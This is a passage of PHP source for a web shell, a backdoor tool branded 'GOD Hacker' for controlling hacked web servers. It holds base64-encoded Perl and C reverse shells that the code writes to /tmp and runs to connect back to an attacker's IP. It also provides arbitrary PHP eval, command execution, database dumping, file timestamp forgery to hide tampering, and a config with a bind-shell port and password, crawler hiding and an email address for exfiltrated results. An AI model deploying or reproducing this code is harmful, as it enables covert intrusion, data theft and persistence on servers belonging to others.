					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('<table border="0" cellpadding="0" cellspacing="0">');
				p('<form action="'.$self.'" method="post">');
				makehide('haz','sqladmin');
				p($dbform);
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if($highver) {
				p('<td>Engine</td>');
				p('<td>Collation</td>');
				}
				p('</tr>');
				foreach ($tabledb as $key => $table) {
					$tbg = bg();
					p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
					p('<td>'.$table['Rows'].'</td>');
					p('<td>'.$table['Data_length'].'</td>');
					p('<td>'.$table['Create_time'].'</td>');
					p('<td>'.$table['Update_time'].'</td>');
					if($highver) {
					p('<td>'.$table['Engine'].'</td>');
					p('<td>'.$table['Collation'].'</td>');
					}
					p('</tr>');
				}
				p('<tr class="'.bg().'">');
				p('<td>&nbsp;</td>');
				p('<td>Total tables: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
				p('</tr>');
				p('<tr class="'.bg().'"><td colspan="'.($highver ? 8 : 6).'"><input name="saveasfile" value="1" type="checkbox" /> Save as file <input class="input" name="path" value="'.F_ROOT.$_SERVER['HTTP_HOST'].'_MySQL.sql" type="text" size="60" /> <input class="bt" type="submit" name="downrar" value="Export selection table" /></td></tr>');
				makehide('doing','backupmysql');
				p("</form>\n</table>");
				fr($query);
			}
		}
	}
	tbfoot();
}
elseif($haz == 'bconx') {
	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
	!$yourport && $yourport = '12345';
	$usedb = array('perl'=>'perl','c'=>'c');
$rv_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$rv_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
if($start && $yourip && $yourport && $use){
		if($use == 'perl') {
			sv_file('/tmp/god_bc',@base64_decode($rv_connect));
			$res = mycmd(which('perl')." /tmp/god_bc $yourip $yourport &");
		} else {
			sv_file('/tmp/god_bc.c',@base64_decode($rv_connect_c));
			$res = mycmd('gcc -o /tmp/god_bc /tmp/god_bc.c');
			@unlink('/tmp/god_bc.c');
			$res = mycmd("/tmp/god_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}
	formhead(array('title'=>'Back Connect'));
	makehide('haz','bconx');
	p('<p>');
	p('Your IP:');
	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
	p('Your Port:');
	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
	p('Use:');
	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
	p("</p>\n</form>");
}
elseif($haz=='evl') {
	$phpcode=trim($phpcode);
	if($phpcode){
		if(!strstr($phpcode,'<?')) {$phpcode="<?php\n{$phpcode}\n?>";}
		p('<pre>');
		eval("?".">$phpcode<?");
		echo'</pre>';
	}
	formhead(array('title'=>'Eval PHP Code'));
	makehide('haz','evl');
	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
	formfooter();
}
elseif($haz == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File'));
	makehide('haz','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
	formfooter();
}
elseif($haz == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	formhead(array('title'=>'Clone file was last modified time'));
	makehide('haz','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Set last modified'));
	makehide('haz','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('year:');
	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
}
elseif($haz == 'sh') {
	if(IS_WIN && IS_COM) {
		if($program && $parameter) {
			$shell= new COM('Shell.Application');
			$a = $shell->ShellExecute($program,$parameter);
			m('Program run has '.(!$a ? 'success' : 'fail'));
		}
		!$program && $program = 'c:\windows\system32\cmd.exe';
		!$parameter && $parameter = '/c net start > '.F_ROOT.'log.txt';
		formhead(array('title'=>'Execute Program'));
		makehide('haz','sh');
		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
		p("</p>\n</form>");
	}
	formhead(array('title'=>'Execute Command'));
	makehide('haz','sh');
	if(IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Command','name'=>'ex','value'=>$ex));
	makeinput(array('class'=>'bt','type'=>'submit','value'=>'Execute'));
	p("</p>\n</form>");
	if($ex) {
		p('<hr width="100%" noshade><pre>');
		if($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$ex);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if(is_resource($process)) {
				fwrite($pipes[0], $ex."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(htmlspecialchars(mycmd($ex)));
		}
		p('</pre>');
	}
}
elseif($haz=='env') {
	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
	$info = array(
		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('Server OS',PHP_OS),
		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 => array('PHP run mode',strtoupper(php_sapi_name())),
		9 => array('The file path',$_SERVER['SCRIPT_FILENAME']),
		10 => array('PHP Version',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:gohaz(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('Administrator',$adminmail),
		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 => array('enable_dl',getcfg('enable_dl')),
		16 => array('display_errors',getcfg('display_errors')),
		17 => array('register_globals',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('Open Basedir',getcfg('open_basedir')),
		20 => array('memory_limit',getcfg('memory_limit')),
		21 => array('post_max_size',getcfg('post_max_size')),
		22 => array('upload_max_filesize',$upsize),
		23 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		24 => array('disable_functions',join(' ', nofunc())),
	);
	if($phpvarname) {
		m($phpvarname .' : '.getcfg($phpvarname));
	}
	formhead(array('title'=>'Server environment'));
	makehide('haz','env');
	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();
	$hp = array(0=> 'Server', 1=> 'PHP');
	for($a=0;$a<2;$a++) {
		p('<h2>'.$hp[$a].' &raquo;</h2>');
		p('<ul class="info">');
		if($a==0) {
			for($i=1;$i<=9;$i++) {
			p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		} elseif($a == 1) {
			for($i=10;$i<=24;$i++) {
			p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		}
		p('</ul>');
	}
}else {
m('Undefined Action');
}
?>

</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
<span style="float:right;"><?php debuginfo();ob_end_flush();?></span> Copyright &copy;2009-<?php echo date('Y');?> <a href="http://god.god/" target="_blank">GOD Hacker</a> All Rights Reserved.
</div>
</body>
</html>
<?php
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num > $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page > $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from < 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$to = $page;
				}
			} elseif($to > $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
	}
	return $multipage;
}
function html_clean($content) {
	$content = htmlspecialchars($content, ENT_QUOTES);
	$content = str_replace(array("\n",'  ',"\t"), array("<br />",'&nbsp;&nbsp;','&nbsp;&nbsp;&nbsp;&nbsp;'), $content);
	return $content;
}
function GetList($dir){
global $dirdata,$j,$nowpath;
!$j && $j=1;
if($dh = opendir($dir)) {
	while ($file = readdir($dh)) {
		$f=str_replace('//','/',$dir.'/'.$file);
		if($file!='.' && $file!='..' && is_dir($f)){
			if(is_writable($f)) {
				$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
				$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
				$dirdata[$j]['dirchmod']=getChmod($f);
				$dirdata[$j]['dirperm']=getPerms($f);
				$dirdata[$j]['dirlink']=ue($dir);
				$dirdata[$j]['server_link']=$f;
				$dirdata[$j]['client_link']=ue($f);
				$j++;
			}
			GetList($f);
		}
	}
	closedir($dh);
	clearstatcache();
	return $dirdata;
	} else {
	return array();
	}
}
function qy($sql) { 
$res = $error = '';
if(!$res = @mysql_query($sql)) { 
	return 0;
	} else if(is_resource($res)) {
	return 1; 
	} else {
	return 2;
	}	
return 0;
}
function q($sql) {return @mysql_query($sql);}
function fr($qy){mysql_free_result($qy);}
class PHPZip{
	var $out='';
	function PHPZip($dir)	{
		if(isfunc('gzcompress'))	{
			$curdir = getcwd();
			if(is_array($dir)) $filelist = $dir;
			else{
				$filelist=$this -> GetFileList($dir);
				foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
			}
			if((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
			else chdir($curdir);
			if(count($filelist)>0){
				foreach($filelist as $filename){
					if(is_file($filename)){
						$fd = fopen ($filename, 'r');
						$content = @fread ($fd, filesize($filename));
						fclose ($fd);
						if(is_array($dir)) $filename = basename($filename);
						$this -> addFile($content, $filename);
					}
				}
				$this->out = $this -> file();
				chdir($curdir);
			}
			return 1;
		}
		else return 0;
	}
	function GetFileList($dir){
		static $a;
		if(is_dir($dir)) {
			if($dh = opendir($dir)) {
				while ($file = readdir($dh)) {
					if($file!='.' && $file!='..'){
						$f=$dir .'/'. $file;
						if(is_dir($f)) $this->GetFileList($f);
						$a[]=$f;
					}
				}
				closedir($dh);
			}
		}
		return $a;
	}
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function unix2DosTime($unixtime = 0) {
		$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		if($timearray['year'] < 1980) {
			$timearray['year']    = 1980;
			$timearray['mon']     = 1;
			$timearray['mday']    = 1;
			$timearray['hours']   = 0;
			$timearray['minutes'] = 0;
			$timearray['seconds'] = 0;
		}
		return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	}
	function addFile($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->unix2DosTime($time));
		$hexdtime = '\x' . $dtime[6] . $dtime[7]
		. '\x' . $dtime[4] . $dtime[5]
		. '\x' . $dtime[2] . $dtime[3]
		. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function file() {
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .	pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
	}
}
function sqldumptable($table, $fp=0) {
	$tabledump = "DROP TABLE IF EXISTS $table;\n";
	$tabledump .= "CREATE TABLE $table (\n";
	$firstfield=1;
	$fields = q("SHOW FIELDS FROM $table");
	while ($field = mysql_fetch_array($fields)) {
		if(!$firstfield) {
			$tabledump .= ",\n";
		} else {
			$firstfield=0;
		}
		$tabledump .= "   $field[Field] $field[Type]";
		if(!empty($field["Default"])) {
			$tabledump .= " DEFAULT '$field[Default]'";
		}
		if($field['Null'] != "YES") {
			$tabledump .= " NOT NULL";
		}
		if($field['Extra'] != "") {
			$tabledump .= " $field[Extra]";
		}
	}
	fr($fields);
	$keys = q("SHOW KEYS FROM $table");
	while ($key = mysql_fetch_array($keys)) {
		$kname=$key['Key_name'];
		if($kname != "PRIMARY" && $key['Non_unique'] == 0) {
			$kname="UNIQUE|$kname";
		}
		if(!is_array($index[$kname])) {
			$index[$kname] = array();
		}
		$index[$kname][] = $key['Column_name'];
	}
	fr($keys);
	while(list($kname, $columns) = @each($index)) {
		$tabledump .= ",\n";
		$colnames=implode($columns,",");
		if($kname == "PRIMARY") {
			$tabledump .= "   PRIMARY KEY ($colnames)";
		} else {
			if(substr($kname,0,6) == "UNIQUE") {
				$kname=substr($kname,7);
			}
			$tabledump .= "   KEY $kname ($colnames)";
		}
	}
	$tabledump .= "\n);\n\n";
	if($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}
	$rows = q("SELECT * FROM $table");
	$numfields = mysql_num_fields($rows);
	while ($row = mysql_fetch_array($rows)) {
		$tabledump = "INSERT INTO $table VALUES(";
		$fieldcounter=-1;
		$firstfield=1;
		while (++$fieldcounter<$numfields) {
			if(!$firstfield) {
				$tabledump.=", ";
			} else {
				$firstfield=0;
			}
			if(!isset($row[$fieldcounter])) {
				$tabledump .= "NULL";
			} else {
				$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
			}
		}
		$tabledump .= ");\n";
		if($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fr($rows);
	if($fp) {
		fwrite($fp,"\n");
	} else {
		echo "\n";
	}
}
exit();
} elseif(isset($_SESSION['shelltest'])) {
/* Copyright &>/dev/null */
$config = array(
 "version" => "2.0.2011.0827", /* build version. */
 "auth" => array(
   "use_auth" => 0, /* bool value, TRUE=[ Ask for login ] / FALSE=[ Don't ask ] */
   "md5_user" => "098f6bcd4621d373cade4e832627b4f6",
   "md5_pass" => "098f6bcd4621d373cade4e832627b4f6"),
 "default_vars" => array(
  "language" => "en", /* default lang, en=English */
  "email" => "q_q_x_x@yahoo.com", /* send results from specific tools to this address */
  "default_sort" => "0a", /* column 0, a=Ascending d=Descending */
  "default_act" => "tools", /* available: ls, search, upload, cmd, eval, sql, mailer, encoders, tools, processes, sysinfo */
  "bind_port" => "31337", "bind_pass" => "P@55w0rd",
  "backcon_port" => "31337",
  "sql_host" => "localhost", "sql_user" => "root", "sql_db" => "mysql", "sql_table" => "users",
  "ftp_user" => "anonymous", "ftp_pass" => "anonymous@ftp.com",
  "downloada" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR",
 ),
 "banned" => array(
  "agents" => array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"), /* This agents (matched in regexp) are not allowed */
  "send_header" => 'HTTP/1.0 404 Not Found'), /* Will send this header and exit. */
 "use_buffer" => 1, /* bool value, TRUE=[ Allow copy/paste ], FALSE=[..] */
 "visual" => array(
  "width" => "1024", /* Table width in pixels */
  "images" => 1, /* bool value, TRUE=[ Show icons ] / FALSE=[ Don't show icons ] */
  "skins" => array("dark","light"),
  "default_skin" => "light", /* Default color skin */
  "light" => array(
   "bodybg"=>"#717678",
   "tbarbg1"=>"#AAAAAA", "tbarbg2"=>"#BFBFBF", "tbarbordert"=>"#BBBBBB", "tbarborderb"=>"#AAAAAA",
   "topbg1"=>"#BBBBBB", "topbg2"=>"#CCCCCC", "topborder1"=>"#CDCDCD", "topcolor"=>"#333333", "topshadow"=>"#DDDDDD",
   "tlinkcolor"=>"#333333", "tlinkshadow"=>"#DDDDDD", "tlinkcolorhover"=>"#000000",
   "qlbg1"=>"#CCCCCC", "qlbg2"=>"#AAAAAA", "qlborder"=>"#DDDDDD", "qlcolor"=>"#222222", "qlshadow"=>"#DDDDDD", "qlcolorhover"=>"#000000",
   "footerbg1"=>"#CCCCCC", "footerbg2"=>"#AAAAAA", "footerborder1"=>"#BBBBBB", "footercolor"=>"#333333", "footershadow"=>"#DDDDDD",
   "tablebg"=>"#F2F2F2", "tableshadow"=>"#666666", "tableborder"=>"#777777 ",
   "errcolor"=>"#FF0000", "okcolor"=>"#008200", "normalcolor"=>"#333333", "dircolor"=>"#333333",
   "fontfam"=>"'sans-serif',sans-serif", "fontcolor"=>"#525252",
   "idirborder"=>"#2F7595", "idirbg1"=>"#93BED7", "idirbg2"=>"#63A0C7", 
   "ifileborder"=>"#cccccc", "ifilebg1"=>"#FFFFFF", "ifilebg2"=>"#DDDDDD",
   "reg_self"=>"#7B7869", "reg_interesting"=>"#008200", "reg_bad"=>"#FF0000",
  ),
  "dark" => array(
   "bodybg"=>"#717678",
   "tbarbg1"=>"#141414", "tbarbg2"=>"#111111", "tbarbordert"=>"#111111", "tbarborderb"=>"#000000",
   "topbg1"=>"#111111", "topbg2"=>"#222222", "topborder1"=>"#222222", "topcolor"=>"#CCCCCC", "topshadow"=>"#000000",
   "tlinkcolor"=>"#DDDDDD", "tlinkshadow"=>"#000000", "tlinkcolorhover"=>"#FFFFFF",
   "qlbg1"=>"#222222", "qlbg2"=>"#111111", "qlborder"=>"#333333", "qlcolor"=>"#F3F3F3", "qlshadow"=>"#0A0A0A", "qlcolorhover"=>"#FFFFFF",
   "footerbg1"=>"#141414", "footerbg2"=>"#111111", "footerborder1"=>"#333333", "footercolor"=>"#CCCCCC", "footershadow"=>"#000000",
   "tablebg"=>"#F2F2F2", "tableshadow"=>"#444444", "tableborder"=>"#666666",
   "errcolor"=>"#FF0000", "okcolor"=>"#008200", "normalcolor"=>"#333333", "dircolor"=>"#333333",
   "fontfam"=>"'sans-serif',sans-serif", "fontcolor"=>"#525252",
   "idirborder"=>"#2F7595", "idirbg1"=>"#93BED7", "idirbg2"=>"#63A0C7",
   "ifileborder"=>"#cccccc", "ifilebg1"=>"#FFFFFF", "ifilebg2"=>"#DDDDDD",
   "reg_self"=>"#7B7869", "reg_interesting"=>"#008200", "reg_bad"=>"#FF0000",
  ),
 ),
 "reg_interesting"=>array(
  "d"=>array('backup','admin'),/* highlight interesting dirs */
  "f"=>array('conf(.*)\.php$','\.sql$','\.db$','auth(.*)\.php$')/* highlight interesting files */
 ),
 "reg_bad"=>array(
  "d"=>array('root'),/* highlight bad dirs */
  "f"=>array('iptables','ipchains')/* highlight bad files */
 ),
);

$lang["en"]=array(
"0"=>"AUTHENTICATION REQUIRED",
"1"=>"USER",
"2"=>"PASS",
"3"=>"Connect",
"4"=>"SERVER WHOIS",
"5"=>"TRACEROUTE",
"6"=>"SELF REMOVE",
"7"=>"LOGOUT",
"8"=>"SYS",
"9"=>"KERNEL",
"10"=>"DISK TOTAL/FREE",
"11"=>"WEB SOFTWARE",
"12"=>"SAFE MODE",
"13"=>"OPEN BASEDIR",
"14"=>"CURL",
"15"=>"MYSQL",
"16"=>"MSSQL",
"17"=>"ORACLE",
"18"=>"POSTGRESQL",
"19"=>"ON",
"20"=>"OFF",
"21"=>"YES",
"22"=>"NO",
"23"=>"BACK",
"24"=>"FILES",
"25"=>"SEARCH",
"26"=>"UPLOAD",
"27"=>"CMD",
"28"=>"EVAL",
"29"=>"SQL",
"30"=>"MAILERS",
"31"=>"CALC",
"32"=>"TOOLS",
"33"=>"PROC",
"34"=>"SYSINFO",
"35"=>"FILE",
"36"=>"DIR",
"37"=>"Show All",
"38"=>"Dirs",
"39"=>"Files",
"40"=>"Archives",
"41"=>"Exes",
"42"=>"PHP",
"43"=>"Html",
"44"=>"Text",
"45"=>"Images",
"46"=>"Other",
"47"=>"Show Icons",
"48"=>"Hide Icons",
"49"=>"Enable Buffer",
"50"=>"Disable Buffer",
"51"=>"Empty Buffer",
"52"=>"Show Buffer",
"53"=>"Hide Buffer",
"54"=>"Paste Copy",
"55"=>"Paste Cut",
"56"=>"Paste All",
"57"=>"Name",
"58"=>"Size",
"59"=>"Modified",
"60"=>"Owner/Group",
"61"=>"Perms",
"62"=>"Action",
"63"=>"Select All",
"64"=>"None",
"65"=>"Inverse",
"66"=>"With Selected",
"67"=>"Copy",
"68"=>"Cut",
"69"=>"Unset Copy",
"70"=>"Unset Cut",
"71"=>"Unset All",
"72"=>"Delete",
"73"=>"Rename",
"74"=>"Functions",
"75"=>"Edit",
"76"=>"Download",
"77"=>"Confirm",
"78"=>"VIEWING FILE:",
"79"=>"Text",
"80"=>"Code",
"81"=>"Html",
"82"=>"Html-NoJS",
"83"=>"Execute",
"84"=>"Session",
"85"=>"Sdb",
"86"=>"INI",
"87"=>"Image",
"88"=>"Hexdump",
"89"=>"Browser Default",
